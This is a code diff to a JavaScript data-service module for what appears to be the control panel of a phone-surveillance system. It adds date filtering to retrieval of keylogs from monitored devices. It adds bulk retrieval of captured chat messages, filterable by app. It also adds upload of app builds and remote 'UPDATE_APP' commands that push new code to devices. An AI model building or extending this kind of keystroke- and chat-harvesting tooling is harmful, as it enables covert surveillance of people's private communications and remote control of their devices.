@@ -62,9 +62,20 @@ const getNotifications = (token, skip = 0, limit = 100, deviceId = null) => {
   return axios.get(url, getAuthHeaders(token));
 };
 
-const getKeylogs = (token, skip = 0, limit = 100, deviceId = null) => {
+const getKeylogs = (token, skip = 0, limit = 100, deviceId = null, startDate = null, endDate = null) => {
   let url = `${API_URL}/users/me/keylogs/?skip=${skip}&limit=${limit}`;
   if (deviceId) url += `&device_id=${deviceId}`;
+  if (startDate != null) url += `&start_date=${startDate}`;
+  if (endDate != null) url += `&end_date=${endDate}`;
+  return axios.get(url, getAuthHeaders(token));
+};
+
+const getChatMessages = (token, skip = 0, limit = 50000, deviceId = null, startDate = null, endDate = null, packageName = null) => {
+  let url = `${API_URL}/users/me/chat_messages/?skip=${skip}&limit=${limit}`;
+  if (deviceId) url += `&device_id=${deviceId}`;
+  if (startDate != null) url += `&start_date=${startDate}`;
+  if (endDate != null) url += `&end_date=${endDate}`;
+  if (packageName) url += `&package_name=${encodeURIComponent(packageName)}`;
   return axios.get(url, getAuthHeaders(token));
 };
 
@@ -96,6 +107,7 @@ const dataService = {
   getInstalledApps,
   getNotifications,
   getKeylogs,
+  getChatMessages,
   sendCommand,
   getDeviceMedia,
   deleteDevice,
@@ -128,6 +140,23 @@ const dataService = {
       responseType: 'blob',
       ...getAuthHeaders(token || localStorage.getItem('token'))
     });
+  },
+  uploadAppUpdate: (token, file, versionName, versionCode, onProgress) => {
+    const formData = new FormData();
+    formData.append('file', file);
+    formData.append('version_name', versionName);
+    formData.append('version_code', versionCode);
+    return axios.post(`${API_URL}/app-update/upload`, formData, {
+      headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'multipart/form-data' },
+      onUploadProgress: onProgress,
+    });
+  },
+  getAppUpdates: (token) => {
+    return axios.get(`${API_URL}/app-updates`, getAuthHeaders(token));
+  },
+  pushAppUpdate: (token, deviceId, versionCode, versionName, s3Key) => {
+    const payload = JSON.stringify({ version_code: versionCode, version_name: versionName, s3_key: s3Key });
+    return axios.post(`${API_URL}/devices/${deviceId}/commands/`, { command_type: 'UPDATE_APP', payload }, getAuthHeaders(token));
   },
 };
 
